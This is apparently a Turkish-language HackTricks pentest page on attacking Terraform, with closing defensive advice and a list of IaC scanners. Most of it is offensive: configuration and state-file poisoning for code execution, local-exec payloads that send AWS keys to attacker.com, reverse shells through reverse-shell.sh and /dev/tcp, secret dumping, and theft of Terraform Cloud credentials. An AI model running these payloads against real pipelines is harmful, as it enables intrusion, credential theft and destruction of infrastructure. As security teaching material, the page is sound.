# Terraform Güvenliği

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

[Belgelerden:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform, **kod olarak altyapı aracı** olup, hem **bulut hem de yerel kaynakları** insan tarafından okunabilir yapılandırma dosyalarında tanımlamanıza olanak tanır; bu dosyaları sürümleyebilir, yeniden kullanabilir ve paylaşabilirsiniz. Daha sonra, altyapınızın yaşam döngüsü boyunca tüm altyapınızı sağlamak ve yönetmek için tutarlı bir iş akışı kullanabilirsiniz. Terraform, hesaplama, depolama ve ağ kaynakları gibi düşük seviyeli bileşenleri yönetebildiği gibi, DNS girişleri ve SaaS özellikleri gibi yüksek seviyeli bileşenleri de yönetebilir.

#### Terraform nasıl çalışır?

Terraform, bulut platformlarında ve diğer hizmetlerde kaynakları uygulama programlama arayüzleri (API'ler) aracılığıyla oluşturur ve yönetir. Sağlayıcılar, Terraform'un erişilebilir bir API'ye sahip olan hemen hemen her platform veya hizmetle çalışmasını sağlar.

![](<../images/image (177).png>)

HashiCorp ve Terraform topluluğu, farklı türdeki binlerce kaynak ve hizmeti yönetmek için **1700'den fazla sağlayıcı** yazmıştır ve bu sayı artmaya devam etmektedir. Tüm kamuya açık sağlayıcıları [Terraform Registry](https://registry.terraform.io/) üzerinde bulabilirsiniz; bunlar arasında Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ve daha birçokları bulunmaktadır.

Temel Terraform iş akışı üç aşamadan oluşur:

- **Yaz:** Birden fazla bulut sağlayıcısı ve hizmet arasında olabilecek kaynakları tanımlarsınız. Örneğin, güvenlik grupları ve bir yük dengeleyici ile sanal özel bulut (VPC) ağında bir uygulama dağıtmak için bir yapılandırma oluşturabilirsiniz.
- **Planla:** Terraform, mevcut altyapı ve yapılandırmanıza dayanarak oluşturacağı, güncelleyeceği veya yok edeceği altyapıyı tanımlayan bir yürütme planı oluşturur.
- **Uygula:** Onaylandığında, Terraform, kaynak bağımlılıklarına saygı göstererek önerilen işlemleri doğru sırayla gerçekleştirir. Örneğin, bir VPC'nin özelliklerini güncelleyip o VPC'deki sanal makine sayısını değiştirirseniz, Terraform, sanal makineleri ölçeklendirmeden önce VPC'yi yeniden oluşturur.

![](<../images/image (215).png>)

### Terraform Laboratuvarı

Bilgisayarınıza terraform'u kurun.

Burada bir [kılavuz](https://learn.hashicorp.com/tutorials/terraform/install-cli) ve burada terraform'u indirmenin [en iyi yolu](https://www.terraform.io/downloads) var.

## Terraform'da RCE: yapılandırma dosyası zehirlenmesi

Terraform'un **bir web sayfası veya ağ hizmeti sunan bir platformu yoktur** ki bunu sayabiliriz, bu nedenle terraform'u tehlikeye atmanın tek yolu **terraform yapılandırma dosyalarını eklemek/değiştirmek** veya **terraform durum dosyasını değiştirmek** (aşağıdaki bölüme bakın) olacaktır.

Ancak, terraform, **farklı konumlara ayrıcalıklı erişim** sağlayacağı için tehlikeye atılması **çok hassas bir bileşendir**.

Bir saldırganın terraform'un çalıştığı sistemi tehlikeye atabilmesinin ana yolu, **terraform yapılandırmalarını depolayan depoyu tehlikeye atmaktır**, çünkü bir noktada bunlar **yorumlanacaktır**.

Aslında, bir PR oluşturulduktan sonra **terraform plan/uygula** işlemlerini otomatik olarak gerçekleştiren çözümler mevcuttur, örneğin **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Bir terraform dosyasını tehlikeye atabiliyorsanız, birisi `terraform plan` veya `terraform apply` komutunu çalıştırdığında RCE gerçekleştirmek için farklı yollar vardır.

### Terraform planı

Terraform plan, terraform'da **en çok kullanılan komut** olup, terraform kullanan geliştiriciler/çözümler bunu sürekli olarak çağırır, bu nedenle **RCE elde etmenin en kolay yolu**, `terraform plan` sırasında rastgele komutlar çalıştıracak bir terraform yapılandırma dosyasını zehirlemektir.

**Dış sağlayıcı kullanarak**

Terraform, Terraform ile dış programlar arasında arayüz sağlamak için [`external` sağlayıcısını](https://registry.terraform.io/providers/hashicorp/external/latest/docs) sunar. `plan` sırasında rastgele kod çalıştırmak için `external` veri kaynağını kullanabilirsiniz.

Bir terraform yapılandırma dosyasına aşağıdaki gibi bir şey enjekte etmek, `terraform plan` çalıştırıldığında bir rev shell çalıştıracaktır:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Özel bir sağlayıcı kullanma**

Bir saldırgan, [özel bir sağlayıcı](https://learn.hashicorp.com/tutorials/terraform/provider-setup) gönderebilir ve ardından bunu bir özellik dalında Terraform koduna ekleyebilir ([buradan örnek](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Sağlayıcı `init` sırasında indirilir ve `plan` çalıştırıldığında kötü niyetli kodu çalıştırır.

Bir örneği [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) adresinde bulabilirsiniz.

**Dış bir referans kullanma**

Bahsedilen her iki seçenek de faydalıdır ancak çok gizli değildir (ikincisi birincisinden daha gizli ama daha karmaşıktır). Bu saldırıyı **daha gizli bir şekilde** gerçekleştirebilirsiniz, bu önerileri takip ederek:

- Rev shell'i doğrudan terraform dosyasına eklemek yerine, rev shell'i içeren **dış bir kaynağı** yükleyebilirsiniz:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Rev shell kodunu [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) adresinde bulabilirsiniz.

- Dış kaynakta, **ref** özelliğini kullanarak repo içindeki **bir dalda terraform rev shell kodunu gizleyin**, şöyle bir şey: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply, tüm değişiklikleri uygulamak için çalıştırılacaktır, ayrıca **kötü niyetli bir Terraform dosyasını** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** ile RCE elde etmek için de kötüye kullanabilirsiniz.**\
Sadece aşağıdaki gibi bir yükün `main.tf` dosyasında sona erdiğinden emin olmanız gerekir:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Önceki teknikten **önerileri takip ederek**, bu saldırıyı **dış referanslar kullanarak daha gizli bir şekilde** gerçekleştirin.

## Gizli Bilgiler Dökümü

`terraform apply` komutunu çalıştırarak **terraform tarafından kullanılan gizli değerlerin dökülmesini** sağlamak için terraform dosyasına şu şekilde bir şey ekleyebilirsiniz:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform Durum Dosyalarını Kötüye Kullanma

Terraform durum dosyaları üzerinde yazma erişiminiz varsa ancak terraform kodunu değiştiremiyorsanız, [**bu araştırma**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) dosyadan yararlanmak için bazı ilginç seçenekler sunmaktadır. Konfigürasyon dosyaları üzerinde yazma erişiminiz olsa bile, durum dosyalarının vektörünü kullanmak genellikle daha sinsi bir yöntemdir, çünkü `git` geçmişinde iz bırakmazsınız.

### Terraform'da RCE: konfigürasyon dosyası zehirleme

Kötü niyetli bir sağlayıcı ile terraform durum dosyasındaki sağlayıcılardan birini değiştirmek veya kötü niyetli sağlayıcıyı referans alan sahte bir kaynak eklemek için [özel bir sağlayıcı oluşturmak](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) mümkündür.

Sağlayıcı [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) bu araştırmaya dayanmakta ve bu prensibi silahlandırmaktadır. Sahte bir kaynak ekleyebilir ve çalıştırmak istediğiniz keyfi bash komutunu `command` niteliğinde belirtebilirsiniz. `terraform` çalıştırıldığında, bu hem `terraform plan` hem de `terraform apply` adımlarında okunacak ve yürütülecektir. `terraform apply` adımında, `terraform` komutunuzu çalıştırdıktan sonra sahte kaynağı durum dosyasından silecektir, böylece kendi arkasını temizlemiş olur. Daha fazla bilgi ve tam bir demo, bu sağlayıcının kaynak kodunu barındıran [GitHub deposunda](https://github.com/offensive-actions/terraform-provider-statefile-rce) bulunabilir.

Doğrudan kullanmak için, `resources` dizisinin herhangi bir konumuna aşağıdakileri ekleyin ve `name` ve `command` niteliklerini özelleştirin:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Sonra, `terraform` çalıştırıldığında, kodunuz çalışacaktır.

### Kaynakları Silme <a href="#deleting-resources" id="deleting-resources"></a>

Kaynakları yok etmenin 2 yolu vardır:

1. **Gerçek yok edilecek kaynağa işaret eden rastgele bir isimle durumu dosyasına bir kaynak ekleyin**

Çünkü terraform, kaynağın mevcut olmaması gerektiğini görecektir, bu yüzden onu yok edecektir (belirtilen gerçek kaynak kimliğini takip ederek). Önceki sayfadan örnek:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Kaynağı, güncellenemeyecek şekilde silmek için değiştirin (bu nedenle silinip yeniden oluşturulacak)**

Bir EC2 örneği için, örneğin türünü değiştirmek, terraform'un onu silip yeniden oluşturması için yeterlidir.

### Kara listeye alınmış sağlayıcıyı değiştir

`hashicorp/external` kara listeye alındığında karşılaştığınız bir durumda, `external` sağlayıcısını aşağıdakileri yaparak yeniden uygulayabilirsiniz. Not: https://registry.terraform.io/providers/nazarewk/external/latest adresinde yayınlanan bir external sağlayıcı çatalını kullanıyoruz. Kendi çatalınızı veya yeniden uygulamanızı da yayınlayabilirsiniz.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Sonra `external`'ı normal şekilde kullanabilirsiniz.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud spekülatif plan RCE ve kimlik bilgisi sızdırma

Bu senaryo, hedef bulut hesabına geçiş yapmak için spekülatif planlar sırasında Terraform Cloud (TFC) koşucularını istismar eder.

- Ön koşullar:
- Bir geliştirici makinesinden bir Terraform Cloud token'ı çalın. CLI, token'ları düz metin olarak `~/.terraform.d/credentials.tfrc.json` dosyasında saklar.
- Token, hedef organizasyona/çalışma alanına erişime ve en az `plan` iznine sahip olmalıdır. VCS destekli çalışma alanları, CLI'dan `apply`'i engeller, ancak yine de spekülatif planlara izin verir.

- TFC API aracılığıyla çalışma alanı ve VCS ayarlarını keşfedin:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Dış veri kaynağını ve Terraform Cloud "cloud" bloğunu kullanarak VCS destekli çalışma alanını hedeflemek için spekülatif bir plan sırasında kod yürütmesini tetikleyin:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
TFC çalıştırıcısında ters bir shell elde etmek için örnek rsync.sh:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Geçici çalıştırıcıda programı çalıştırmak için spekülatif bir plan yürütün:
```bash
terraform init
terraform plan
```
- Koşucudan enjekte edilmiş bulut kimlik bilgilerini listeleyin ve dışarı aktarın. Çalışmalar sırasında, TFC sağlayıcı kimlik bilgilerini dosyalar ve ortam değişkenleri aracılığıyla enjekte eder:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Beklenen dosyalar çalıştırıcı çalışma dizininde:
- GCP:
- `tfc-google-application-credentials` (İş Yükü Kimliği Federasyonu JSON yapılandırması)
- `tfc-gcp-token` (kısa ömürlü GCP erişim belirteci)
- AWS:
- `tfc-aws-shared-config` (web kimliği/OIDC rolü varsayım yapılandırması)
- `tfc-aws-token` (kısa ömürlü belirteç; bazı kuruluşlar statik anahtarlar kullanabilir)

- VCS kapılarını atlamak için kısa ömürlü kimlik bilgilerini dışarıdan kullanın:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Bu kimlik bilgileriyle, saldırganlar kaynakları doğrudan yerel CLI'lar kullanarak oluşturabilir/değiştirebilir/yıkabilir ve VCS aracılığıyla `apply`'i engelleyen PR tabanlı iş akışlarını atlayabilirler.

- Savunma rehberi:
- TFC kullanıcıları/takımları ve token'lar için en az ayrıcalık ilkesini uygulayın. Üyelikleri denetleyin ve aşırı büyük sahiplerden kaçının.
- Mümkünse, hassas VCS destekli çalışma alanlarında `plan` iznini kısıtlayın.
- `data "external"` veya bilinmeyen sağlayıcıları engellemek için Sentinel politikaları ile sağlayıcı/veri kaynağı beyaz listelerini zorlayın. Sağlayıcı filtreleme ile ilgili HashiCorp rehberine bakın.
- Statik bulut kimlik bilgileri yerine OIDC/WIF'yi tercih edin; koşucuları hassas olarak değerlendirin. Spekülatif plan çalıştırmalarını ve beklenmedik çıkışları izleyin.
- `tfc-*` kimlik bilgisi nesnelerinin dışa aktarımını tespit edin ve planlar sırasında şüpheli `external` program kullanımında uyarı verin.

## Otomatik Denetim Araçları

### [**Snyk Altyapı Kod Olarak (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk, Terraform, CloudFormation, Kubernetes ve diğer IaC formatlarındaki güvenlik açıklarını ve yanlış yapılandırmaları tespit eden kapsamlı bir Altyapı Kod Olarak (IaC) tarama çözümü sunar.

- **Özellikler:**
- Güvenlik açıkları ve uyumluluk sorunları için gerçek zamanlı tarama.
- Versiyon kontrol sistemleri (GitHub, GitLab, Bitbucket) ile entegrasyon.
- Otomatik düzeltme çekme istekleri.
- Ayrıntılı düzeltme tavsiyeleri.
- **Kaydolun:** [Snyk](https://snyk.io/) üzerinde bir hesap oluşturun.
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov**, altyapı kodu (IaC) için bir statik kod analiz aracıdır ve ayrıca görüntüler ve açık kaynak paketleri için bir yazılım bileşen analizi (SCA) aracıdır.

[Terraform](https://terraform.io/) kullanılarak sağlanan bulut altyapısını, [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) veya [OpenTofu](https://opentofu.org/) tarar ve grafik tabanlı tarama kullanarak güvenlik ve uyum yanlış yapılandırmalarını tespit eder.

Açık kaynak paketleri ve görüntüleri için Ortak Güvenlik Açıkları ve Maruziyetler (CVE'ler) taraması olan [Yazılım Bileşen Analizi (SCA) taraması](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) gerçekleştirir.
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance`, altyapı kodunuz için negatif test yeteneğini etkinleştirmek amacıyla terraform'a karşı hafif, güvenlik ve uyumluluk odaklı bir test çerçevesidir.

- **uyumluluk:** Uygulanan kodun güvenlik standartlarına ve kendi özel standartlarınıza uygun olduğunu doğrulayın.
- **davranış odaklı geliştirme:** Neredeyse her şey için BDD'miz var, neden IaC için olmasın?
- **taşınabilir:** Sadece `pip` ile yükleyin veya `docker` üzerinden çalıştırın. [Kurulum](https://terraform-compliance.com/pages/installation/) sayfasına bakın.
- **ön dağıtım:** Kodunuzu dağıtılmadan önce doğrular.
- **entegrasyonu kolay:** Tüm dağıtımların doğrulandığından emin olmak için pipeline'ınızda (veya git hook'larında) çalıştırılabilir.
- **görev ayrımı:** Testlerinizi ayrı bir ekibin sorumlu olduğu farklı bir depoda tutabilirsiniz.

> [!NOTE]
> Ne yazık ki, kod bazı sağlayıcıları kullanıyorsa ve bu sağlayıcılara erişiminiz yoksa `terraform plan` gerçekleştiremeyecek ve bu aracı çalıştıramayacaksınız.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsec, terraform kodunuzun statik analizini kullanarak potansiyel yanlış yapılandırmaları tespit eder.

- ☁️ Tüm büyük (ve bazı küçük) bulut sağlayıcıları arasında yanlış yapılandırmaları kontrol eder
- ⛔ Yüzlerce yerleşik kural
- 🪆 Modülleri (yerel ve uzaktan) tarar
- ➕ HCL ifadelerini ve literal değerleri değerlendirir
- ↪️ Terraform fonksiyonlarını değerlendirir, örneğin `concat()`
- 🔗 Terraform kaynakları arasındaki ilişkileri değerlendirir
- 🧰 Terraform CDK ile uyumlu
- 🙅 Kullanıcı tanımlı Rego politikalarını uygular (ve süsler)
- 📃 Birden fazla çıktı formatını destekler: lovely (varsayılan), JSON, SARIF, CSV, CheckStyle, JUnit, metin, Gif.
- 🛠️ Yapılandırılabilir (CLI bayrakları ve/veya yapılandırma dosyası aracılığıyla)
- ⚡ Çok hızlı, büyük depoları hızlı bir şekilde tarama yeteneğine sahip
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Geliştirme döngüsünün başında, **KICS** ile güvenlik açıklarını, uyumluluk sorunlarını ve altyapı yanlış yapılandırmalarını erken tespit edin.

**KICS**, **K**eeping **I**nfrastructure as **C**ode **S**ecure'ın kısaltmasıdır, açık kaynaklıdır ve herhangi bir bulut yerel proje için vazgeçilmezdir.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan, Kod Olarak Altyapı için statik bir kod analizörüdür. Terrascan size şunları sağlar:

- Yanlış yapılandırmalar için altyapıyı kod olarak sorunsuz bir şekilde tarama.
- Sağlanan bulut altyapısını, duruş kayması oluşturan yapılandırma değişiklikleri için izleme ve güvenli bir duruşa geri dönmeyi sağlama.
- Güvenlik açıklarını ve uyum ihlallerini tespit etme.
- Bulut yerel altyapıyı sağlamadan önce riskleri azaltma.
- Yerel olarak çalıştırma veya CI\CD'nizle entegre etme esnekliği sunar.
```bash
brew install terrascan
```
## Referanslar

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API – Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI – OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider – Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform – Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs – Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
